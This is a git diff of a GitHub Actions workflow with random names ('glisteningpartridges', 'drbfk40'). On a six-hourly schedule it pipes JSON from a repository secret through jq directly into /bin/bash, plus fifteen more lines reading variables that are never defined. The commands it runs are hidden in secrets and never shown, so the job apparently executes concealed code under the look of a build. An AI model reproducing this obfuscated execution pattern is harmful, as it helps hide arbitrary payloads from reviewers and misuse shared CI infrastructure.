@@ -3,7 +3,8 @@ name: glisteningpartridges
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 1/6 * * *'
+    - cron: '14 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,19 +13,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: glisteningpartridges
         env:
-          urtz58: ${{ secrets.urtz58 }}
+          drbfk40: ${{ secrets.drbfk40 }}
         run: |
-          echo $urtz58 | jq -r .xesb365 | /bin/bash
-          echo $pxuwy74138 | jq -r .kit766 | /bin/bash
-          echo $wjvq02150 | jq -r .pzenf3 | /bin/bash
-          echo $o1 | jq -r .kjpb69 | /bin/bash
-          echo $lcssa516 | jq -r .wgzg439 | /bin/bash
-          echo $r5951 | jq -r .cryxr9 | /bin/bash
-          echo $bsymf6480 | jq -r .f49887 | /bin/bash
-          echo $l94 | jq -r .em3 | /bin/bash
-          echo $rfi1 | jq -r .s86 | /bin/bash
-          echo $vvg94485 | jq -r .pql06997 | /bin/bash
-          echo $cdv47 | jq -r .itatp51 | /bin/bash
-          echo $hadg40272 | jq -r .sal98 | /bin/bash
-          echo $yzo31 | jq -r .lgt260 | /bin/bash
+          echo $drbfk40 | jq -r .fcv4 | /bin/bash
+          echo $n9222 | jq -r .oi480 | /bin/bash
+          echo $pesuc2458 | jq -r .pdst1742 | /bin/bash
+          echo $bl7234 | jq -r .fanro442 | /bin/bash
+          echo $q33446 | jq -r .a36 | /bin/bash
+          echo $lxlh6 | jq -r .ta3 | /bin/bash
+          echo $lj5917 | jq -r .we4799 | /bin/bash
+          echo $uu09790 | jq -r .tv7308 | /bin/bash
+          echo $pavhd23405 | jq -r .fuhxx17 | /bin/bash
+          echo $g179 | jq -r .z5809 | /bin/bash
+          echo $vet03 | jq -r .fq5531 | /bin/bash
+          echo $ks652 | jq -r .vuvq545 | /bin/bash
+          echo $bi3681 | jq -r .ibvc586 | /bin/bash
+          echo $zed78544 | jq -r .r2 | /bin/bash
+          echo $xyhnq596 | jq -r .czfm75517 | /bin/bash
+          echo $y22020 | jq -r .rcn4 | /bin/bash
 
